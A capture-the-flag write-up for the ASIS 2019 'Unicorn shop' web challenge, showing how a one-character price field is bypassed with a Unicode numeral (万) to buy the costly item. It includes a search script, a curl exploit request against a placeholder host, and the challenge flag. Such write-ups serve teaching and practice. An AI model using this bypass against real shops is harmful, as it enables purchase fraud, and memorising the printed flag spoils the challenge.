---
title: "[ASIS 2019] Unicorn shop"
ctf: "ASIS 2019 CTF"
date: 2026-05-21
category: web
difficulty: easy
points: N/A
flag_format: "flag{...}"
author: "Claude"
---

# [ASIS 2019] Unicorn shop

## Summary

A Unicode normalization vulnerability where the price field only accepts one character, but Unicode characters with numeric values (like Chinese numeral `万` = 10000) can bypass the restriction to purchase the expensive "ultra unicorn" item.

## Solution

### Step 1: Identify the restriction

The shop has 4 items. Item 4 (ultra unicorn) costs 1337.0 and is the target. When attempting to purchase, the server returns "Only one char(?) allowed!" for the price field. The HTML comment hints that `charset=utf-8` is "really important."

### Step 2: Find Unicode characters with numeric value >= 1337

Python's `unicodedata.numeric()` can identify characters with numeric values:

```python
import unicodedata

# Find Unicode characters with numeric value >= 1337
for i in range(0x10FFFF + 1):
    try:
        c = chr(i)
        if unicodedata.numeric(c, None) is not None:
            val = unicodedata.numeric(c)
            if val >= 1337:
                print(f'U+{i:04X}: {c!r} = {val}')
    except:
        pass
```

Output includes `万` (U+4E07) = 10000.0, which is a single character with value > 1337.

### Step 3: Purchase with Unicode character

```bash
curl -s -X POST "http://TARGET/charge" -d "id=4&price=万"
```

The server interprets `万` as 10000.0, which is >= 1337.0, allowing the purchase.

## Flag

```
flag{14eab61a-9b3c-49e2-be07-256a5417f56b}
```